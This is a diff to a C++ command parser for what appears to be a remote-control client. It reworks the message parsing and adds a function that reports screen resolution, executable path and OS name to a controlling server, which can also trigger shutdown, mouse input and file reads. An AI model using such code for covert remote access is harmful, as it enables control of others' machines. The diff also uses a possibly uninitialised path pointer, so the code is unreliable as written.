@@ -1,15 +1,14 @@
 #include "commands.h"
-#include "utils.h"
-#include "fileTransfer.h"
+#include "../shared/utils.h"
+#include "../shared/fileTransfer.h"
 
-int parseMessages(Server *c, std::string buffer)
+int parseMessages(Server *c, char * buf, int length)
 {
-    printf("PARSING: %s\n", buffer.c_str());
-    if (strncmp(buffer.c_str(), "Server> ", 8) == 0)
+    printf("PARSING: %s\n", buf);
+    if (strncmp(buf, "Server> ", 8) == 0)
     {
-        buffer = &(buffer.c_str())[8];
+        buf = &(buf[8]);
     }
-    const char *buf = buffer.c_str();
 
     if (strncmp(buf, "/udp ", 5) == 0)
     {
@@ -32,7 +31,7 @@ int parseMessages(Server *c, std::string buffer)
             c->sendTCP(msg);
             return 0;
         }
-        const int BUFSIZE = 1000;
+        const int BUFSIZE = 1024;
         char buffer[BUFSIZE];
         std::string ret = "";
         while (fgets(buffer, BUFSIZE, f))
@@ -82,7 +81,7 @@ int parseMessages(Server *c, std::string buffer)
     }
     else if (strncmp(buf, "/requesting_data", 16) == 0)
     {
-        c->sendTCPIntro();
+        sendTCPIntro(c);
     }
     else if (strncmp(buf, "/shutdown", 9) == 0)
     {
@@ -100,10 +99,12 @@ int parseMessages(Server *c, std::string buffer)
     return 0;
 }
 
-int parseUDPMessages(Server *c, std::string recv)
+int parseUDPMessages(Server *c, char * buf, int length)
 {
+    std::string recv = buf;
     printf("PARSING: %s\n", recv.c_str());
-    if (!parseFile(c, recv)) {
+    
+    if (parseFile(c, buf, length)) {
         //This if-statement is mainly here to ensure we don't
         //check the command against other commands.
         //Saves some processing time.
@@ -211,4 +212,38 @@ void m_mouseUp() {
 
 void m_rmouseUp() {
 
+}
+
+void sendTCPIntro(Server * c) {
+    char x[10];
+    char y[10];
+    itoa(getDesktopResolution()[0], x, 10);
+    itoa(getDesktopResolution()[1], y, 10);
+    
+	std::stringstream sends_res_x;
+	sends_res_x << "/add_x " << x;
+	c->sendTCP(sends_res_x.str());
+
+	std::stringstream sends_res_y;
+	sends_res_y << "/add_y " << y;
+	c->sendTCP(sends_res_y.str());
+
+	std::stringstream sends_ip;
+    sends_ip << "/add_ip " << "0.0.0.0";
+    c->sendTCP(sends_ip.str());
+
+    char result[PATH_MAX];
+	ssize_t count = readlink("/proc/self/exe", result, PATH_MAX);
+    const char * pathe;
+    if (count != -1) {
+        pathe = dirname(result);
+    }
+
+	std::stringstream sends_path;
+    sends_path << "/add_path " << pathe;
+    c->sendTCP(sends_path.str());
+
+    std::stringstream sends_name;;
+	sends_name << "/add_name " << "LINUX" << "  VERSION: " << ".10";
+    c->sendTCP(sends_name.str());
 }
